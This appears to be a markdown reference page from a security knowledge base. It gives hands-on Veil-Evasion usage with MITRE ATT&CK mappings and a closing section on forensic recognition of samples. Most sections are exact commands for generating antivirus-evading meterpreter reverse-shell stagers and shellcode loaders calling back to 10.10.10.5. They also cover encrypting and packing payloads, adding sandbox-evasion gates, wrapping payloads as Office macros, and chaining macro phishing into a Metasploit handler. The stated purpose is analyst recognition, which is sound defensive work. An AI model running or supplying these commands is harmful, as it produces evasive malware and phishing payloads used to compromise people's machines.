# Veil-Evasion — Hands-On Use Cases

> Every command below is verified against `Veil.py`'s live `argparse` definitions and `tools/evasion/tool.py`'s interactive menu-dispatch source — see `01 - Overview.md`'s switches table for the full flag reference. These are the documented, publicly-known usage patterns, not novel tradecraft — the goal here is recognition: what a run of each scenario actually looks like on the wire and on disk.

## Contents
- [Interactive Menu-Driven Generation](#interactive-menu-driven-generation)
- [Non-Interactive CLI Generation for Automation](#non-interactive-cli-generation-for-automation)
- [Mass-Generation of Language Variants From One Campaign](#mass-generation-of-language-variants-from-one-campaign)
- [Purpose-Built Meterpreter Stager in a Specific Language](#purpose-built-meterpreter-stager-in-a-specific-language)
- [Wrapping Arbitrary msfvenom Shellcode via shellcode_inject](#wrapping-arbitrary-msfvenom-shellcode-via-shellcode_inject)
- [Applying a Source/Shellcode Obfuscation Module](#applying-a-sourceshellcode-obfuscation-module)
- [Compiling a Python Payload to a Standalone PE](#compiling-a-python-payload-to-a-standalone-pe)
- [Wrapping a Payload as an Office Macro](#wrapping-a-payload-as-an-office-macro)
- [Auto-Generated Metasploit Handler Resource File](#auto-generated-metasploit-handler-resource-file)
- [Environmental Keying Against Sandbox Analysis](#environmental-keying-against-sandbox-analysis)
- [Standalone Ordnance Shellcode Generation and Encoding](#standalone-ordnance-shellcode-generation-and-encoding)
- [Operator OPSEC Self-Check via checkvt](#operator-opsec-self-check-via-checkvt)
- [Chained Workflow — Macro Delivery to a Metasploit Handler](#chained-workflow--macro-delivery-to-a-metasploit-handler)
- [Recognizing a Legacy Sample in a 2026 Investigation](#recognizing-a-legacy-sample-in-a-2026-investigation)

---

## Interactive Menu-Driven Generation

**MITRE ATT&CK:** T1027 (Obfuscated Files or Information), T1588.002 (Obtain Capabilities: Tool)

The default, documented workflow — the operator navigates three nested menus rather than passing every option as a flag:

```
$ Veil.py
Veil>: use Evasion
Veil/Evasion>: list
Veil/Evasion>: use python/shellcode_inject/aes_encrypt.py
[python/shellcode_inject/aes_encrypt.py>>]: set LHOST 10.10.10.5
[python/shellcode_inject/aes_encrypt.py>>]: set LPORT 443
[python/shellcode_inject/aes_encrypt.py>>]: generate
```

Prompts the operator for an output base name (default `payload`), writes source to `/var/lib/veil/output/source/`, compiles per the configured compiler, and drops the artifact in `/var/lib/veil/output/compiled/`. An analyst reconstructing operator intent from a captured terminal session should read the `use <path>` line first — the path itself names both the target language and the obfuscation module chosen.

## Non-Interactive CLI Generation for Automation

**MITRE ATT&CK:** T1027, T1059.006 (Command and Scripting Interpreter: Python)

```
Veil.py -t Evasion -p python/shellcode_inject/aes_encrypt.py \
    --ip 10.10.10.5 --port 443 -o dropbox_update
```

Skips every menu — a single command line carries the full payload selection and callback configuration. This is the pattern to expect in any automated build pipeline, phishing-kit integration, or CI-style payload-refresh job, since it requires no `input()` interaction at all.

## Mass-Generation of Language Variants From One Campaign

**MITRE ATT&CK:** T1027, T1588.002

```
for lang in python cs powershell go; do
    Veil.py -t Evasion -p ${lang}/shellcode_inject/aes_encrypt.py \
        --ip 10.10.10.5 --port 443 -o beacon_${lang}
done
```

A single callback (`LHOST`/`LPORT`) reused across multiple language/obfuscation-module combinations — the classic pattern for testing which variant survives a specific target environment's AV stack before a campaign, or for maintaining a portfolio of alternate droppers against one C2. On the operator's own host, this produces a burst of near-simultaneous `generate` calls sharing the same `LHOST`/`LPORT` values — a strong source-side correlation signal (see `03`/`05`).

## Purpose-Built Meterpreter Stager in a Specific Language

**MITRE ATT&CK:** T1027, T1071.001 (Application Layer Protocol: Web Protocols — for the resulting `reverse_https` callback)

```
Veil.py -t Evasion -p cs/meterpreter/rev_https.py --ip 10.10.10.5 --port 8443 -o svc_helper
```

The `meterpreter/*` family is hand-written per language specifically to stage a Metasploit meterpreter session — distinct from `shellcode_inject/*`, which is a generic carrier for arbitrary shellcode. Choosing C# here (vs. Python or PowerShell) is typically an environment-fit decision: a target that blocks interpreted-script execution but allows compiled .NET assemblies, for example.

## Wrapping Arbitrary msfvenom Shellcode via shellcode_inject

**MITRE ATT&CK:** T1027, T1055 (Process Injection — in-process `VirtualAlloc`+`CreateThread` shellcode execution)

```
Veil/Evasion>: use go/shellcode_inject/flat.py
[go/shellcode_inject/flat.py>>]: set LHOST 10.10.10.5
[go/shellcode_inject/flat.py>>]: set LPORT 443
[go/shellcode_inject/flat.py>>]: generate
```

`--msfvenom` (default `windows/meterpreter/reverse_tcp`) selects which Metasploit payload string Veil requests shellcode for internally before wrapping it in the chosen language's execution primitive — this is the direct evidence Evasion is a wrapper around msfvenom's payload output, not an independent shellcode source. Any msfvenom-supported payload string can be substituted here, not just meterpreter.

## Applying a Source/Shellcode Obfuscation Module

**MITRE ATT&CK:** T1027, T1140 (Deobfuscate/Decode Files or Information — the embedded-key decrypt-at-runtime step)

```
Veil/Evasion>: use python/shellcode_inject/arc_encrypt.py
[python/shellcode_inject/arc_encrypt.py>>]: options
[python/shellcode_inject/arc_encrypt.py>>]: set LHOST 10.10.10.5
[python/shellcode_inject/arc_encrypt.py>>]: set LPORT 443
[python/shellcode_inject/arc_encrypt.py>>]: generate
```

Choosing `arc_encrypt` (RC4) instead of `flat` (unencoded) trades a larger, decryptor-carrying artifact for a changed static signature. Recall from `01`: the RC4 key is embedded in cleartext in the generated source — recovering the sample recovers the key in the same step, so this defeats naive byte-signature matching but not a static analyst willing to read the source.

## Compiling a Python Payload to a Standalone PE

**MITRE ATT&CK:** T1027.002 (Software Packing)

```
Veil.py --compiler pyinstaller -t Evasion -p python/meterpreter/rev_https.py \
    --ip 10.10.10.5 --port 443 -o quarterly_report
```

PyInstaller (Veil's only currently wired-up `--compiler` value) bundles the Python interpreter and every imported module into a single onefile PE. This is the step with the single strongest downstream forensic signature — see `04 - Target Evidence.md`'s coverage of PyInstaller's runtime `_MEI*` self-extraction temp directory.

## Wrapping a Payload as an Office Macro

**MITRE ATT&CK:** T1027, T1204.002 (User Execution: Malicious File), T1566.001 (Phishing: Spearphishing Attachment)

```
Veil/Evasion>: use powershell/shellcode_inject/base64_substitution.py
[powershell/shellcode_inject/base64_substitution.py>>]: set LHOST 10.10.10.5
[powershell/shellcode_inject/base64_substitution.py>>]: set LPORT 443
[powershell/shellcode_inject/base64_substitution.py>>]: generate
```

`auxiliary/macro_converter.py` wraps a generated PowerShell/VBScript payload as an Office VBA `AutoOpen`/`Document_Open` macro rather than a standalone executable — feeding directly into a maldoc phishing delivery chain instead of an EXE-attachment or drive-by-download chain.

## Auto-Generated Metasploit Handler Resource File

**MITRE ATT&CK:** T1071.001, T1105 (Ingress Tool Transfer — the eventual stage-2 pull, if a staged payload was selected)

Any `generate` run with `LHOST`/`RHOST` set writes a matching `.rc` file to `/var/lib/veil/output/handlers/<output-name>.rc` alongside the payload itself — a one-line `msfconsole -r <name>.rc` stands up the correct `multi/handler` (or protocol-specific handler) with matching options pre-populated. This is the direct, source-confirmed operational link between Veil and `Metasploit/msfconsole/` — see that folder for the handler-listener mechanics themselves.

## Environmental Keying Against Sandbox Analysis

**MITRE ATT&CK:** T1497.001 (Virtualization/Sandbox Evasion: System Checks), T1027

```
Veil/Evasion>: use ruby/meterpreter/rev_tcp.py
[ruby/meterpreter/rev_tcp.py>>]: set LHOST 10.10.10.5
[ruby/meterpreter/rev_tcp.py>>]: set LPORT 443
[ruby/meterpreter/rev_tcp.py>>]: set SLEEP 30
[ruby/meterpreter/rev_tcp.py>>]: set HOSTNAME DESKTOP-FIN01
[ruby/meterpreter/rev_tcp.py>>]: generate
```

Setting `SLEEP` alone triggers a source-level warning (`tool.py` explicitly checks for this and refuses a clean generate without a paired check) — the tool itself enforces pairing a sleep timer with an environmental gate (`HOSTNAME`/`USERNAME`/`DOMAIN`) so the payload only executes after both a time delay and a hostname/domain match, defeating naive automated sandboxes that don't rename themselves to match a target's naming convention or don't wait out the sleep.

## Standalone Ordnance Shellcode Generation and Encoding

**MITRE ATT&CK:** T1027, T1588.002

```
Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 10.10.10.5 --port 443 \
    -e polymorphic --print-stats
```

Independent of the Evasion tool and of msfvenom entirely — Ordnance generates and encodes raw shellcode on its own. Used when an operator wants shellcode for a custom loader/injector outside Veil's own language templates, or wants an encoder chain independent of Metasploit's.

## Operator OPSEC Self-Check via checkvt

**MITRE ATT&CK:** T1589 (Gather Victim Identity Information — inverted: operator gathering intel on their own artifact's exposure)

```
Veil/Evasion>: checkvt
 [*] Checking Virus Total for payload hashes...
```

Reads every line of `/var/lib/veil/output/hashes.txt` (one SHA-hash-and-filename entry appended per successful `generate`) and shells out to a bundled `vt-notify.rb` script that queries VirusTotal per hash. A confirmed hit ("was found") prints inline. This is a real, source-verified network egress point from the **operator's own host** — see `03 - Source Evidence.md`.

## Chained Workflow — Macro Delivery to a Metasploit Handler

**MITRE ATT&CK:** T1566.001, T1204.002, T1071.001

1. `use powershell/shellcode_inject/aes_encrypt.py` → `set LHOST`/`LPORT` → `generate` with `--msfvenom windows/meterpreter/reverse_https`
2. `auxiliary/macro_converter.py` wraps the resulting PowerShell payload into a `.doc`/`.xlsm` macro
3. Operator delivers the document via phishing (outside Veil's own scope — this repo's `Cobalt Strike/`, `AADInternals/`, and general phishing tradecraft cover delivery separately)
4. Target opens the document, enables macros, `AutoOpen` fires the embedded PowerShell
5. `msfconsole -r payload.rc` (the auto-generated handler from step 1) catches the resulting meterpreter session

The macro-delivery step and the resulting on-target process tree are covered in full in `04 - Target Evidence.md`.

## Recognizing a Legacy Sample in a 2026 Investigation

**MITRE ATT&CK:** T1027, T1027.002

No new command here — this is an analysis scenario, not an operator action. Given a recovered PE or script sample suspected of Veil origin (old incident, malware repository, threat-intel feed), confirm via the source-verified structural tells this page's research surfaced: a PyInstaller `_MEI*` self-extraction behavior at runtime (Python-language payloads), an embedded literal AES/RC4/DES key sitting alongside encrypted shellcode in the binary/script, or a `.rc`-file-style handler configuration recovered alongside it referencing `windows/meterpreter/reverse_tcp|https`. Given the tool's 2020 code freeze, weight this toward historical-incident review rather than an assumption of current, evolving tradecraft — see `01 - Overview.md`'s History section.
